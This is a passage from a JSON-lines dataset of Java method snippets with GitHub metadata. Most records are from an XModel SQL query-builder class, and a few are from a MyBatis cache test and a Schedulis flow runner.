          }            sqlSB.append(\") VALUES (\" + patternSB.toString() + \")\");            sqlSB.append(\" ON DUPLICATE KEY UPDATE \");            String updateField = null;            if (mUpdateFields.size() > 0) {                for (int i = 0, n = mUpdateFields.size(); i < n; i++) {                    updateField = \"`\" + mUpdateFields.get(i) + \"`\";                    if (i > 0) {                        sqlSB.append(\",\");                    }                    sqlSB.append(updateField).append(\"=VALUES(\").append(updateField).append(\")\");                }            } else {                mValues = mBatchValues.get(0);                for (int i = 0, n = mValues.size(); i < n; i++) {                    clause = mValues.get(i);                    if (i > 0) {                        sqlSB.append(\",\");                    }                    sqlSB.append(clause.getKey()).append(\"=VALUES(\").append(clause.getKey()).append(\")\");                }            }        } else if (type == SQLType.DELETE) {            sqlSB.append(\"DELETE FROM `\" + tableName() + \"` \");            sqlSB.append(\" WHERE 1=1 \");            if (mWheres.size() > 0) {                ClauseWhere clause = null;                Object value = null;                for (int i = 0, n = mWheres.size(); i < n; i++) {                    clause = mWheres.get(i);                    value = clause.getValue();                    if (value != null) {                        mStatementParams.add(value);                    }                    sqlSB.append(\" AND \");                    sqlSB.append(clause.getPattern());                }            }        }        mStatementSQL = sqlSB.toString();        logger.info(\"XModel.StatementSQL: \" + mStatementSQL);    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getJSONObject", "params": ["ResultSet"], "throws": ["SQLException"], "modifiers": ["protected"], "return_type": "JSONObject", "snippet": "    protected JSONObject getJSONObject(ResultSet rs) throws SQLException {        JSONObject data = new JSONObject();        if (rs == null) {            return data;        }        if (!rs.next()) {            return data;        }        ResultSetMetaData metaData = rs.getMetaData();        int index = 0, type, count = metaData.getColumnCount();        for (index = 1; index <= count; index++) {            type = metaData.getColumnType(index);            if (Types.INTEGER == type || Types.TINYINT == type || Types.SMALLINT == type || Types.BIT == type) {                data.put(metaData.getColumnLabel(index), rs.getInt(index));            } else if (Types.BIGINT == type) {                data.put(metaData.getColumnLabel(index), rs.getLong(index));            } else if (Types.DOUBLE == type || Types.FLOAT == type || Types.DECIMAL == type) {                data.put(metaData.getColumnLabel(index), rs.getDouble(index));            } else {                data.put(metaData.getColumnLabel(index), rs.getString(index));            }        }        rs.close();        return data;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getJSONArray", "params": ["ResultSet"], "throws": ["SQLException"], "modifiers": ["protected"], "return_type": "JSONArray", "snippet": "    protected JSONArray getJSONArray(ResultSet rs) throws SQLException {        return this.getJSONArray(rs, false);    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getJSONArray", "params": ["ResultSet", "boolean"], "throws": ["SQLException"], "modifiers": ["protected"], "return_type": "JSONArray", "snippet": "    protected JSONArray getJSONArray(ResultSet rs, boolean single) throws SQLException {        JSONArray data = new JSONArray();        if (rs == null) {            return data;        }        ResultSetMetaData metaData = rs.getMetaData();        int index = 0, type, count = metaData.getColumnCount();        while (rs.next()) {            if (single && count == 1) {                type = metaData.getColumnType(1);                if (Types.INTEGER == type || Types.TINYINT == type || Types.SMALLINT == type || Types.BIT == type) {                    data.add(rs.getInt(1));                } else if (Types.BIGINT == type) {                    data.add(rs.getLong(1));                } else if (Types.DOUBLE == type || Types.FLOAT == type || Types.DECIMAL == type) {                    data.add(rs.getDouble(1));                } else {                    data.add(rs.getString(1));                }            } else {                JSONObject item = new JSONObject();                for (index = 1; index <= count; index++) {                    type = metaData.getColumnType(index);                    if (Types.INTEGER == type || Types.TINYINT == type || Types.SMALLINT == type || Types.BIT == type) {                        item.put(metaData.getColumnLabel(index), rs.getInt(index));                    } else if (Types.BIGINT == type) {                        item.put(metaData.getColumnLabel(index), rs.getLong(index));                    } else if (Types.DOUBLE == type || Types.FLOAT == type || Types.DECIMAL == type) {                        item.put(metaData.getColumnLabel(index), rs.getDouble(index));                    } else {                        item.put(metaData.getColumnLabel(index), rs.getString(index));                    }                }                data.add(item);            }        }        rs.close();        return data;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "set", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel set(String key, Object value) {        mValues.add(new ClauseValue(key.trim(), value));        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setx", "params": ["String", "Object", "ValueCalc"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel setx(String key, Object value, ValueCalc calc) {        mValues.add(new ClauseValue(key.trim(), value, calc));        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setUpdateFields", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel setUpdateFields(String... fields) {        mUpdateFields.addAll(Arrays.asList(fields));        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "setUpdateField", "params": ["String", "Object", "ValueCalc"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel setUpdateField(String field, Object valus, ValueCalc calc) {        mUpdateFields.add(new ClauseValue(field, valus, calc));        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "set", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel set(Map<String, Object> data) {        for (String key : data.keySet()) {            mValues.add(new ClauseValue(key.trim(), data.get(key)));        }        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "set", "params": ["List<Map>"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel set(List<Map<String, Object>> data) {        Map<String, Object> row = null;        List<ClauseValue> tempValues = null;        for (int i = 0, n = data.size(); i < n; i++) {            row = data.get(i);            tempValues = new ArrayList<ClauseValue>();            for (String key : row.keySet()) {                tempValues.add(new ClauseValue(key.trim(), row.get(key)));            }            mBatchValues.add(tempValues);        }        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "addWhere", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel addWhere(String key) {        mWheres.add(new ClauseWhere(key));        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "addWhere", "params": ["String", "Object"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel addWhere(String key, Object value) {        mWheres.add(new ClauseWhere(key.trim(), value));        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "addWhere", "params": ["String", "Object", "WhereType"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel addWhere(String key, Object value, WhereType type) {        if (type == WhereType.IN) {            if (value instanceof JSONArray || value instanceof Object[]) {                mWheres.add(new ClauseWhere(key.trim(), value, type));            } else {                logger.error(\"SQLError:WHERE[IN] value is not instanceof Object[], key=\" + key);            }        } else {            mWheres.add(new ClauseWhere(key.trim(), value, type));        }        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "addWhere", "params": ["ClauseWhere"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel addWhere(ClauseWhere where) {        mWheres.add(where);        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "addWhere", "params": ["List<ClauseWhere>"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel addWhere(List<ClauseWhere> wheres) {        mWheres.addAll(wheres);        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "addWhere", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel addWhere(Map<String, Object> wheres) {        for (String key : wheres.keySet()) {            mWheres.add(new ClauseWhere(key.trim(), wheres.get(key)));        }        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "order", "params": ["String", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel order(String field, boolean desc) {        mOrderList.put(field, desc);        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "group", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel group(String... fields) {        if (fields.length > 0) {            StringBuilder fieldSB = new StringBuilder();            fieldSB.append(\" GROUP BY \");            for (int i = 0, n = fields.length; i < n; i++) {                if (i > 0) {                    fieldSB.append(\",\");                }                fieldSB.append(\"`\" + fields[i].trim() + \"`\");            }            mGroup = fieldSB.toString();        }        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "distinct", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel distinct(boolean flag) {        mDistinct = flag;        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "limit", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel limit(int offset, int total) {        mLimit = \" LIMIT \" + offset + \",\" + total;        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "limit", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel limit(int total) {        mLimit = \" LIMIT \" + total;        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "field", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel field(String fields) {        if (fields != null) {            return this.field(fields.split(\",\"));        }        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "field", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel field(String[] fields) {        if (fields != null) {            String field = null;            for (int i = 0, n = fields.length; i < n; i++) {                field = fields[i].trim();                if (field.indexOf(\"`\") >= 0) {                    mFields.add(field);                } else {                    if (field.indexOf(\" \") > 0 || field.indexOf(\"(\") >= 0) {                        mFields.add(field);                    } else {                        mFields.add(\"`\" + field + \"`\");                    }                }            }        }        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "prepare", "params": [], "throws": null, "modifiers": ["public"], "return_type": "XModel", "snippet": "    public XModel prepare() {        mFields.clear();        mWheres.clear();        mValues.clear();        mUpdateFields.clear();        mBatchValues.clear();        mOrderList.clear();        mGroup = null;        mLimit = null;        mDistinct = false;        mStatementSQL = null;        mException = null;        mStatementParams.clear();        mBatchStatementParams.clear();        return this;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "isErrorDuplicateEntry", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isErrorDuplicateEntry() {        if (this.mException != null) {            logger.error(\"XModel.SQLExcpetion:ErrorCode=\" + this.mException.getErrorCode() + \", SQLSTATE=\" + this.mException.getSQLState());            return 1062 == this.mException.getErrorCode();        }        return false;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getErrorCode", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getErrorCode() {        if (this.mException != null) {            logger.error(\"XModel.SQLExcpetion:ErrorCode=\" + this.mException.getErrorCode() + \", SQLSTATE=\" + this.mException.getSQLState());            return this.mException.getErrorCode();        }        return 1;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getErrorMessage", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getErrorMessage() {        if (this.mException != null) {            logger.error(\"XModel.SQLExcpetion:ErrorCode=\" + this.mException.getErrorCode() + \", SQLSTATE=\" + this.mException.getSQLState());            return this.mException.getMessage();        }        return \"\";    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "formatFields", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String formatFields(String fields) {        return this.formatFields(fields, null);    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "formatFields", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String formatFields(String fields, String tableAlias) {        if (fields != null) {            String prefix = \"\";            if (tableAlias != null && !tableAlias.isEmpty()) {                prefix = tableAlias + \".\";            }            StringBuilder fieldSB = new StringBuilder();            String[] strArr = fields.split(\",\");            for (int i = 0, n = strArr.length; i < n; i++) {                fieldSB.append(prefix).append(\"`\" + strArr[i].trim() + \"`\");                if (i < strArr.length - 1) {                    fieldSB.append(\",\");                }            }            return fieldSB.toString();        }        return null;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "formatInValues", "params": ["Object"], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "    protected String formatInValues(Object[] values) {        if (values != null) {            StringBuilder sb = new StringBuilder();            sb.append(\"(\");            for (int i = 0, n = values.length; i < n; i++) {                if (i > 0) {                    sb.append(\",\");                }                sb.append(\"?\");            }            sb.append(\")\");            return sb.toString();        }        return null;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "formatInValues", "params": ["JSONArray"], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "    protected String formatInValues(JSONArray values) {        if (values != null) {            StringBuilder sb = new StringBuilder();            sb.append(\"(\");            for (int i = 0, n = values.size(); i < n; i++) {                if (i > 0) {                    sb.append(\",\");                }                sb.append(\"?\");            }            sb.append(\")\");            return sb.toString();        }        return null;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "newSQLBuilder", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "SQLBuilder", "snippet": "    protected SQLBuilder newSQLBuilder() {        return new SQLBuilder(this);    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "XModel", "extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"method_name": "getInPattern", "params": [], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "        private String getInPattern() {            StringBuilder sb = new StringBuilder();            if (value instanceof JSONArray) {                JSONArray values = (JSONArray) this.value;                for (int i = 0, n = values.size(); i < n; i++) {                    if (i > 0) {                        sb.append(\",\");                    }                    sb.append(\"?\");                }            } else if (value instanceof Object[]) {                Object[] values = (Object[]) this.value;                for (int i = 0, n = values.length; i < n; i++) {                    if (i > 0) {                        sb.append(\",\");                    }                    sb.append(\"?\");                }            }            return sb.toString();        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "ClauseWhere", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "        public Object getValue() {            if (this.type != null) {                switch (type) {                    case LIKE:                        return \"%\" + this.value + \"%\";                    case LLIKE:                        return \"%\" + this.value;                    case RLIKE:                        return this.value + \"%\";                    default:                        return this.value;                }            }            return this.value;        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "ClauseWhere", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPattern", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getPattern() {            if (this.type != null) {                switch (type) {                    case EQ:                        return \" (`\" + this.key + \"`=?) \";                    case NEQ:                        return \" (`\" + this.key + \"`<>?) \";                    case IN:                        return \" (`\" + this.key + \"` IN (\" + getInPattern() + \")) \";                    case LT:                        return \" (`\" + this.key + \"`<?) \";                    case GT:                        return \" (`\" + this.key + \"`>?) \";                    case LET:                        return \" (`\" + this.key + \"`<=?) \";                    case GET:                        return \" (`\" + this.key + \"`>=?) \";                    case LIKE:                        return \" (`\" + this.key + \"` LIKE ?) \";                    case LLIKE:                        return \" (`\" + this.key + \"` LIKE ?) \";                    case RLIKE:                        return \" (`\" + this.key + \"` LIKE ?) \";                }            }            if (this.value == null) {                return \" (\" + this.key + \") \";            }            return \" (`\" + this.key + \"`=?) \";        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "ClauseWhere", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getValue", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "        public Object getValue() {            return this.value;        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "ClauseValue", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPattern", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getPattern() {            if (calc != null) {                switch (calc) {                    case add:                        return \" `\" + this.key + \"`=(`\" + this.key + \"`+?) \";                    case sub:                        return \" `\" + this.key + \"`=(`\" + this.key + \"`-?) \";                    case mul:                        return \" `\" + this.key + \"`=(`\" + this.key + \"`*?) \";                    case div:                        return \" `\" + this.key + \"`=(`\" + this.key + \"`/?) \";                }            }            return \" `\" + this.key + \"`=? \";        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "ClauseValue", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getKey", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String getKey() {            return \"`\" + this.key + \"`\";        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "ClauseValue", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "appendField", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "SQLBuilder", "snippet": "        public SQLBuilder appendField(String fields) {            sqlSB.append(this.model.formatFields(fields));            return this;        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "SQLBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "fromTable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SQLBuilder", "snippet": "        public SQLBuilder fromTable() {            sqlSB.append(\" FROM `\").append(this.model.tableName()).append(\"` \");            return this;        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "SQLBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "fromTable", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "SQLBuilder", "snippet": "        public SQLBuilder fromTable(String tableName) {            sqlSB.append(\" FROM `\").append(tableName).append(\"` \");            return this;        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "SQLBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "appendTable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SQLBuilder", "snippet": "        public SQLBuilder appendTable() {            sqlSB.append(\" `\").append(this.model.tableName()).append(\"` \");            return this;        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "SQLBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "appendTable", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "SQLBuilder", "snippet": "        public SQLBuilder appendTable(String tableName) {            sqlSB.append(\" `\").append(tableName).append(\"` \");            return this;        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "SQLBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "appendWhere", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "SQLBuilder", "snippet": "        public SQLBuilder appendWhere(String conditions) {            sqlSB.append(\" AND \").append(conditions).append(\" \");            return this;        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "SQLBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "append", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "SQLBuilder", "snippet": "        public SQLBuilder append(Object sql) {            sqlSB.append(String.valueOf(sql));            return this;        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "SQLBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "        public String toString() {            String sql = sqlSB.toString();            if (sqlSB.length() > 0) {                this.clear();            }            return sql;        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "SQLBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "clear", "params": [], "throws": null, "modifiers": ["public"], "return_type": "SQLBuilder", "snippet": "        public SQLBuilder clear() {            sqlSB.setLength(0);            return this;        }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/base/XModel.java", "stars": "2", "class": {"name": "SQLBuilder", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUp", "params": [], "throws": ["Exception"], "modifiers": [], "return_type": "void", "snippet": "  void setUp() throws Exception {    // create a SqlSessionFactory    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/blocking_cache/mybatis-config.xml\")) {      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);    }    // populate in-memory database    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),            \"org/apache/ibatis/submitted/blocking_cache/CreateDB.sql\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/blocking_cache/BlockingCacheTest.java", "stars": "15", "class": {"name": "BlockingCacheTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "testBlockingCache", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void testBlockingCache() {    ExecutorService defaultThreadPool = Executors.newFixedThreadPool(2);    long init = System.currentTimeMillis();    for (int i = 0; i < 2; i++) {      defaultThreadPool.execute(this::accessDB);    }    defaultThreadPool.shutdown();    while (!defaultThreadPool.isTerminated()) {    }    long totalTime = System.currentTimeMillis() - init;    Assertions.assertTrue(totalTime > 1000);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/blocking_cache/BlockingCacheTest.java", "stars": "15", "class": {"name": "BlockingCacheTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "accessDB", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void accessDB() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      PersonMapper pm = sqlSession.getMapper(PersonMapper.class);      pm.findAll();      try {        Thread.sleep(500);      } catch (InterruptedException e) {        Assertions.fail(e.getMessage());      }    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/blocking_cache/BlockingCacheTest.java", "stars": "15", "class": {"name": "BlockingCacheTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "getCycleFlowRunnerEventListener", "params": [], "throws": null, "modifiers": ["public"], "return_type": "EventListener", "snippet": "  public EventListener getCycleFlowRunnerEventListener() {    return this.cycleFlowRunnerEventListener;  }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Schedulis/master/azkaban-exec-server/src/main/java/azkaban/execapp/FlowRunner.java", "stars": "18", "class": {"name": "FlowRunner", "extends": "EventHandler", "implements": ["Runnable"], "modifiers": ["public"]}}, {"method_name": "setCycleFlowRunnerEventListener", "params": ["EventListener"], 